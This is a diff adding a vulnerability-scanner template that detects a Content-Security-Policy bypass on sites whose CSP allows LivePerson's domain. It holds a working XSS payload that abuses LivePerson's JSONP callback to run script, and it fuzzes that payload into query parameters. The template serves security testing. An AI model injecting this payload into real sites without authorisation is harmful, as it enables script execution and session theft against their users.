@@ -1,0 +1,45 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - liveperson_lptag_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: liveperson_lptag_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - liveperson.net
+  method: GET
+  path:
+  - '{{BaseURL}}'
+id: liveperson-lptag-csp-bypass
+info:
+  author: renniepak,DhiyaneshDK
+  metadata:
+    verified: true
+  name: Content-Security-Policy Bypass - LivePerson LPTAG
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,liveperson-lptag,vuln
